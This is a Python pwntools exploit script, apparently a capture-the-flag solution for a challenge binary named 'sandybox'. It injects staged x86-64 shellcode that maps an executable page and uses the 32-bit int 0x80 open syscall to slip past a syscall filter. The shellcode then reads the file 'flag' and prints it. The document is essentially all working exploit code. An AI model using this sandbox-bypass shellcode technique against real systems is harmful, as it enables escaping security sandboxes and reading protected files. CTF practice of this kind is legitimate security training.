from pwn import*
p=process('./sandybox')
context.arch = 'amd64'
shellcode = asm(
    """
    mov edx,0x1000
	sub eax,0x1
	syscall
    """
)   # 10 bytes
#mmap rax=0x9
shellcode+= asm(
	"""
    mov rax,0x9
    xor rdi,rdi
    mov rsi,0x1000
    mov rdx,0x7
    mov r10,0x32
    xor r8,r8
    xor r9,r9
    syscall   
    """
)
#open eax=0x5   32bits
shellcode+= asm(
	"""
    mov r12d,eax
	mov rdx,0x67616c66
	mov QWORD PTR [rax],rdx

	mov ebx,eax
	xor ecx,ecx
	mov eax,0x5
	int 0x80   
    """
)
#read rax=0x0
shellcode+= asm(
	"""
	xor edi,edi
	xchg edi,eax
	mov rsi,r12 
	mov edx,0x100
	xor eax,eax
	syscall	
	"""
)
#write rax=0x1
shellcode+= asm(
	"""
	mov rsi,r12
	mov rdx,0x1000
	mov rdi,0x1
	mov rax,0x1
	syscall
	"""
)
#exit rax=0x3c
shellcode+= asm(
	"""
	mov	eax,0x3c
	syscall
	"""
)
log.success('shellcode len = '+str(len(shellcode)))
p.recvuntil("> ")
p.send(shellcode)
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
flag = p.recv(16)
log.success("{}".format(flag))
p.interactive()